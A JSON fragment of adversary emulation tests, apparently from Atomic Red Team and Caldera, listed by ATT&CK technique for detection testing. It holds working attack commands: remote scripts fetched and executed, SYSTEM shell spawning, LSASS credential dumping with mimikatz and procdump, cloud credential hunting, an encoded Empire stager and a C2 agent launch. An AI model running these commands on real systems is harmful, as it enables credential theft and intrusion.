         "technique_id": "T1059.006",
         "technique_name": "Command and Scripting Interpreter: Python",
         "tactic": "execution",
         "description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
         "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python"
      },
      {
         "technique_id": "T1059.006",
         "technique_name": "Command and Scripting Interpreter: Python",
         "tactic": "execution",
         "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n",
         "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'; $which_python"
      },
      {
         "technique_id": "T1059.006",
         "technique_name": "Command and Scripting Interpreter: Python",
         "tactic": "execution",
         "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)",
         "command": "which_python=$(which python || which python3 || which python2); $which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'"
      },
      {
         "technique_id": "T1059.006",
         "technique_name": "Command and Scripting Interpreter: Python",
         "tactic": "execution",
         "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n",
         "command": "which_python=$(which python || which python3 || which python2); $which_python -c \"import pty;pty.spawn('/bin/sh')\"; exit; $which_python -c \"import pty;pty.spawn('/bin/bash')\"; exit"
      }
   ],
   "T1059.003": [
      {
         "technique_id": "T1059.003",
         "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
         "tactic": "execution",
         "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n",
         "command": "cmd /r cmd<\"07a87d_t1059.003_cmd.cmd\""
      },
      {
         "technique_id": "T1059.003",
         "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
         "tactic": "execution",
         "description": "    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.\n    The script will execute 'whoami' then exit.",
         "command": "c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs"
      },
      {
         "technique_id": "T1059.003",
         "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
         "tactic": "execution",
         "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n",
         "command": "%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt"
      },
      {
         "technique_id": "T1059.003",
         "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
         "tactic": "execution",
         "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n",
         "command": "cmd /c \"for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt\" | out-null"
      },
      {
         "technique_id": "T1059.003",
         "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
         "tactic": "execution",
         "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n",
         "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat\""
      },
      {
         "technique_id": "T1059.003",
         "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
         "tactic": "execution",
         "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n",
         "command": "echo \"Hello from the Windows Command Prompt!\" > \"%TEMP%\\test.bin\" & type \"%TEMP%\\test.bin\""
      }
   ],
   "T1059.004": [
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n",
         "command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'; echo $ART |/bin/bash"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n",
         "command": "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh; ls -la /tmp/art.txt; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash; ls -la /tmp/art.txt"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n",
         "command": "ART=$(echo -n \"id\" |base64 -w 0); echo \"\\$ART=$ART\"; echo -n \"$ART\" |base64 -d |/bin/bash; unset ART"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n",
         "command": "chmod +x PathToAtomicsFolder/T1059.004/src/LinEnum.sh; bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
         "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n",
         "command": "chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh; bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n",
         "command": "echo $0; if $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi; if $(printenv SHELL >/dev/null); then printenv SHELL; fi"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n",
         "command": "TMPFILE=$(mktemp); echo \"id\" > $TMPFILE; bash $TMPFILE"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n",
         "command": "useradd -s /bin/bash art; cat /etc/passwd |grep ^art; chsh -s /bin/sh art; cat /etc/passwd |grep ^art"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n",
         "command": "cat /etc/shells"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.\n",
         "command": "uname -srm"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n",
         "command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Bash",
         "tactic": "execution",
         "description": "Creates and executes a simple bash script.\n",
         "command": "sh -c \"echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh\"; sh -c \"echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh\"; chmod +x /tmp/art.sh; sh /tmp/art.sh"
      },
      {
         "technique_id": "T1059.004",
         "technique_name": "Command and Scripting Interpreter: Unix Shell",
         "tactic": "execution",
         "description": "Start a new 54ndc47 agent in background",
         "command": "nohup ./sandcat.go -server #{server} &\n"
      }
   ],
   "T1106": [
      {
         "technique_id": "T1106",
         "technique_name": "Native API",
         "tactic": "execution",
         "description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')"
      },
      {
         "technique_id": "T1106",
         "technique_name": "Native API",
         "tactic": "execution",
         "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')"
      },
      {
         "technique_id": "T1106",
         "technique_name": "Native API",
         "tactic": "execution",
         "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",
         "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe \"7175f8_CreateProcess.cs\" && %tmp%/T1106.exe"
      },
      {
         "technique_id": "T1106",
         "technique_name": "Native API",
         "tactic": "execution",
         "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')"
      }
   ],
   "T1559.002": [
      {
         "technique_id": "T1559.002",
         "technique_name": "Inter-Process Communication: Dynamic Data Exchange",
         "tactic": "execution",
         "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n",
         "command": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\""
      }
   ],
   "T1609": [
      {
         "technique_id": "T1609",
         "technique_name": "Kubernetes Exec Into Container",
         "tactic": "execution",
         "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201ckubectl exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201ckubectl exec\u201d.\n",
         "command": "kubectl create -f $PathtoAtomicsFolder/T1609/src/busybox.yaml -n default; sleep 3; kubectl exec -n default busybox -- uname"
      },
      {
         "technique_id": "T1609",
         "technique_name": "Kubernetes Exec Into Container",
         "tactic": "execution",
         "description": "Attackers who have permissions, can run malicious commands in containers in the cluster using exec command (\u201cdocker exec\u201d). In this method, attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as a backdoor container, and run their malicious code remotely by using \u201cdocker exec\u201d. Kinsing (Golang-based malware) was executed with an Ubuntu container entry point that runs shell scripts.\n",
         "command": "docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ ; docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh; docker exec -i t1609_container bash -c \"cat /tmp/output.txt\""
      }
   ],
   "T1569.001": [
      {
         "technique_id": "T1569.001",
         "technique_name": "System Services: Launchctl",
         "tactic": "execution",
         "description": "Utilize launchctl\n",
         "command": "launchctl submit -l evil -- /System/Applications/Calculator.app/Contents/MacOS/Calculator"
      }
   ],
   "T1204.003": [
      {
         "technique_id": "T1204.003",
         "technique_name": "User Execution: Malicious Image",
         "tactic": "execution",
         "description": "Adversaries may rely on a user running a malicious image to facilitate execution",
         "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\"); Mount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"; $mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter; $finalpath = $mountedpath + \":\\\"; cd $finalpath; .\\calc.exe.lnk"
      }
   ],
   "T1059.007": [
      {
         "technique_id": "T1059.007",
         "technique_name": "Command and Scripting Interpreter: JavaScript",
         "tactic": "execution",
         "description": "JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.",
         "command": "wscript \"85d52c_sys_info.js\""
      },
      {
         "technique_id": "T1059.007",
         "technique_name": "Command and Scripting Interpreter: JavaScript",
         "tactic": "execution",
         "description": "JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\\T1059.007.out.txt",
         "command": "cscript \"85d52c_sys_info.js\" > %tmp%\\T1059.007.out.txt"
      }
   ],
   "T1059.002": [
      {
         "technique_id": "T1059.002",
         "technique_name": "Command and Scripting Interpreter: AppleScript",
         "tactic": "execution",
         "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n",
         "command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\""
      },
      {
         "technique_id": "T1059.002",
         "technique_name": "Command and Scripting Interpreter: AppleScript",
         "tactic": "execution",
         "description": "Add a malicous bookmark which looks like a current one",
         "command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n"
      }
   ],
   "T1003.001": [
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
         "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
         "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
         "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
         "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n",
         "command": "pypykatz live lsa"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}; catch{ $_; exit $_.Exception.Response.StatusCode.Value__}; get-process lsass | Out-Minidump"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
         "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {;       $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\";   } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {;       $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\";   } else {;       $binary_path = \"File not found\";       exit 1;   }; $lsass_pid = get-process lsass |select -expand id; if (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} ; write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1; & $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1; Write-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\""
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
         "command": "%temp%\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\""
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
         "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "Dump lsass for later use with mimikatz",
         "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"
      },
      {
         "technique_id": "T1003.001",
         "technique_name": "OS Credential Dumping: LSASS Memory",
         "tactic": "credential-access",
         "description": "Use Invoke-Mimikatz",
         "command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n"
      }
   ],
   "T1649": [
      {
         "technique_id": "T1649",
         "technique_name": "Steal or Forge Authentication Certificates",
         "tactic": "credential-access",
         "description": "Export all user certificates and add to a compressed archive.\n",
         "command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"; $exfilpath=\"$env:PUBLIC\\T1649\\certs\"; Add-Type -assembly \"system.io.compression.filesystem\"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null; foreach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)"
      }
   ],
   "T1552.001": [
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Search for Passwords on this system using passhunt via WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); passhunt -local $true -noninteractive"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
         "command": "find / -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); SharpCloud -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1552.001",
         "technique_name": "Unsecured Credentials: Credentials In Files",
         "tactic": "credential-access",
         "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powershellsensitive -consoleoutput -noninteractive"
      },
